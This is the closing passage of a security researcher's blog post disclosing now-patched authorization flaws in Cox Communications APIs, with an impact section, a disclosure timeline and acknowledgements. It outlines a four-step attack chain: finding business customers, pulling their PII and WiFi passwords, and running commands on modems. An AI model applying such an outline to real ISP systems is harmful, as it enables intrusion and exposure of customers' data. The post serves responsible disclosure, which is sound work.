<p>I reached out to Cox via their responsible disclosure page and shared details of the vulnerability. They took down the exposed API calls within six hours then began working on the authorization vulnerabilities. I was no longer able to reproduce any of the vulnerabilities the next day.</p>
<h2 id="impact">Impact</h2>
<p>This series of vulnerabilities demonstrated a way in which a fully external attacker with no prerequisites could&#39;ve executed commands and modified the settings of millions of modems, accessed any business customer&#39;s PII, and gained essentially the same permissions of an ISP support team.</p>
<p>Cox is the largest private broadband provider in the United States, the third-largest cable television provider, and the seventh largest telephone carrier in the country. They have millions of customers and are the most popular ISP in 10 states.</p>
<p>An example attack scenario would&#39;ve looked like the following:</p>
<ol>
<li>Search for a Cox business target through the exposed APIs using their name, phone number, email address, or account number</li>
<li>Retrieve their full account PII via querying the returned UUID from step one including device MAC addresses, email, phone number, and address</li>
<li>Query their hardware MAC address to retrieve Wifi password and connected devices</li>
<li>Execute arbitrary commands, update any device property, and takeover victim accounts</li>
</ol>
<p>There were over 700 exposed APIs with many giving administrative functionality (e.g. querying the connected devices of a modem). Each API suffered from the same permission issues where replaying HTTP requests repeatedly would allow an attacker to run unauthorized commands.</p>
<h2 id="addendum">Addendum</h2>
<p>After reporting the vulnerability to Cox, they investigated if the specific vector had ever been maliciously exploited in the past and found no history of abuse (the service I found the vulnerabilities in had gone live in 2023, while my device had been compromised in 2021). They had also informed me that they had no affiliation with the DigitalOcean IP address, meaning that the device had definitely been hacked, just not using the method disclosed in this blog post.</p>
<p>I&#39;m still super curious on the exact way in which my device was compromised as I had never made my modem externally accessible nor even logged into the device from my home network. This blog post really aims to highlight vulnerabilities in the layer of trust between the ISP and customer devices, but the modem could&#39;ve been compromised by some other much more boring method (e.g. local CSRF to RCE 0day which I triggered locally within my home network).</p>
<p>One of the things I&#39;ll never understand was why the attacker was replaying my traffic? They were clearly in my network and could access everything without being detected, why replay all the HTTP requests? So odd.</p>
<p>Anyway, thanks for reading! More than happy to listen to any theories, comments, or whatever about what happened here. Feel free to reach out at samwcurry (symbol goes here) gmail (dot goes here) com.</p>
<h2 id="timeline">Timeline</h2>
<ul>
<li>03/04/2024 - Vulnerability reported to Cox via their <a href="https://www.cox.com/aboutus/policies/cox-security-responsible-disclosure-policy.html">responsible disclosure program</a></li>
<li>03/05/2024 - Vulnerability is hot-patched, all non-essential business endpoints return 403 and no longer function</li>
<li>03/06/2024 - Email Cox that I can no longer reproduce the vulnerability</li>
<li>03/07/2024 - Cox writes that they are beginning a comprehensive security review</li>
<li>04/10/2024 - Informed Cox of intent to disclose 90 days from disclosure</li>
<li>04/29/2024 - Shared link to blog post draft with Cox</li>
</ul>
<h2 id="thanks">Thanks</h2>
<ul>
<li>Thanks to <a href="https://twitter.com/blastbots">@blastbots</a> for the full redesign of the blog, I can now write posts in markdown and have an RSS feed!</li>
<li>Thanks to <a href="https://twitter.com/sshell_">Justin Rhinehart</a> and <a href="https://twitter.com/birchb0y">Alden</a> for working closely with me for the investigation process, providing tons of help doing OSINT stuff.</li>
<li>Thanks to <a href="https://twitter.com/galnagli">Gal Nagli</a>, <a href="https://twitter.com/bbuerhaus">Brett Buerhaus</a>, <a href="https://twitter.com/avlidienbrunn">Mathias Karlsson</a>, <a href="https://twitter.com/d0nutptr">Nathanial Lattimer</a>, <a href="https://twitter.com/xEHLE_">Maik Robert</a>, <a href="https://twitter.com/infosec_au">Shubham Shah</a>, <a href="https://twitter.com/0xteknogeek">Joel Margolis</a>, <a href="https://twitter.com/Rhynorater">Justin Gardner</a>, Daley Borda, <a href="https://twitter.com/umasiii">William Tom</a>, and Ebrietas for reviewing the draft version of this blog post.</li>
<li>Thanks to the Cox Communications security team for quickly fixing the issue and staying in touch throughout the process.</li>
</ul></div></div>
  </body>
</html>
